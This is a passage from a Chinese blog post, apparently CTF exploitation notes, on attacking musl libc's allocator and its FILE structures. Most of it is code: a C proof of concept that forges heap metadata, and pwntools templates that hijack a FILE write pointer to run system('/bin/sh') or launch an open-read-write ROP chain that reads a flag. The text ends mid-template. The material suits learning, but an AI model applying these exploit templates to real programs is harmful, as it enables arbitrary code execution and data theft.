class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable: <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass: <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen: <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> *<span class="title">ctx</span> =</span> (<span class="keyword">struct</span> malloc_context *) (&amp;<span class="built_in">printf</span> + <span class="number">0x247193</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">target</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = ctx-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = size_to_class(FAKE_CHUNK_SIZE - IB);</span><br><span class="line">    fake_meta-&gt;last_idx = LAST_INDEX;</span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;</span><br><span class="line">    fake_group-&gt;meta = fake_meta;</span><br><span class="line">    fake_meta-&gt;avail_mask = ((<span class="number">2U</span> &lt;&lt; LAST_INDEX) - <span class="number">1</span>) ^ (<span class="number">1</span> &lt;&lt; FAKE_CHUNK_INDEX);</span><br><span class="line">    fake_meta-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *fake_chunk = (<span class="type">uint8_t</span> *) ((<span class="type">uint64_t</span>) fake_group-&gt;storage + size_classes[fake_meta-&gt;sizeclass] * UNIT * FAKE_CHUNK_INDEX);</span><br><span class="line">    *(<span class="type">uint16_t</span> *) (fake_chunk - <span class="number">2</span>) = (fake_chunk - fake_group-&gt;storage) / UNIT;</span><br><span class="line">    fake_chunk[<span class="number">-3</span>] = FAKE_CHUNK_INDEX;</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = fake_meta-&gt;next = &amp;target;</span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line">    assert(target.prev == target.next &amp;&amp; target.prev == &amp;target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fsop"><a href="#fsop" class="headerlink" title="fsop"></a>fsop</h2><h3 id="IO-file结构体"><a href="#IO-file结构体" class="headerlink" title="IO_file结构体"></a>IO_file结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="exit利用链"><a href="#exit利用链" class="headerlink" title="exit利用链"></a>exit利用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="keyword">volatile</span> __stdin_used = &amp;__stdin_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stdout_used = &amp;__stdout_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stderr_used = &amp;__stderr_FILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>) &#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f = *__ofl_lock(); f; f = f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos - f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>exit</code>函数最终会调用到三个<code>io file</code>的<code>write</code>函数和<code>seek</code>函数，我们可以将 <code>FILE</code> 结构体开头的几个字节修改为 <code>/bin/sh</code> ，再修改 <code>write</code> 指针的值为 <code>system</code> ，以及修改 <code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一就可以调用到 <code>system(“/bin/sh”)</code><br>总结来说，就是在无沙箱时，需要修改 <code>_IO_FILE</code> 结构体的几个地方：</p><ul><li>起始位置写入 <code>/bin/sh</code></li><li><code>write</code> 写入 <code>system</code> 函数地址。</li><li>好将 <code>lock</code> 设置为小于 <code>0</code> 避免程序卡死在 <code>__lockfile</code> 函数中。(等于 <code>0</code> 貌似也可以)</li></ul><p>fake_file getshell模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x1919810</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc_base+libc.symols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br></pre></td></tr></table></figure><p>若需要<code>orw</code>，这需要一下<code>gadget</code>：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br></pre></td></tr></table></figure><p>总结来说，就是在有沙箱时，需要修改 <code>_IO_FILE</code> 结构体的 <code>3</code> 个地方：</p><ul><li><code>f-&gt;wbase</code> 写入第一个 <code>gadget</code> 地址使得 <code>f-&gt;wpos 、f-&gt;wbase</code> 不等的同时能够执行到 <code>gadget</code></li><li><code>write</code> 写入刚才提到的栈迁移的 <code>gadget</code></li><li>偏移 <code>0x30</code> 处写入新的栈地址配合栈迁移 <code>gadget</code> 完成栈迁移</li><li>此外还需要在其他地方构造好 <code>ROP</code> 链用于 <code>orw</code></li></ul><p>模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(<span class="number">4</span>)  <span class="comment"># id</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># name -&gt; fake chunk</span></span><br><span class="line">fake_node += p64(<span class="number">0x100</span>)  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">2</span>)  <span class="comment"># type</span></span><br><span class="line">fake_node += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># fa</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># ls</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># rs</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, fake_node)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure><h3 id="puts利用链"><a href="#puts利用链" class="headerlink" title="puts利用链"></a>puts利用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">    FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f) == l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k, l = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">    FLOCK(f);</span><br><span class="line">    k = __fwritex(src, l, f);</span><br><span class="line">    FUNLOCK(f);</span><br><span class="line">    <span class="keyword">return</span> k == l ? nmemb : k / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __towrite(FILE *f) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;flags &amp; F_NOWR) &#123;</span><br><span class="line">        f-&gt;flags |= F_ERR;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f) &#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getshell 模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>orw musl-1.2.2 模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">fake_name_addr = libc.address + <span class="number">0xb7990</span></span><br><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = 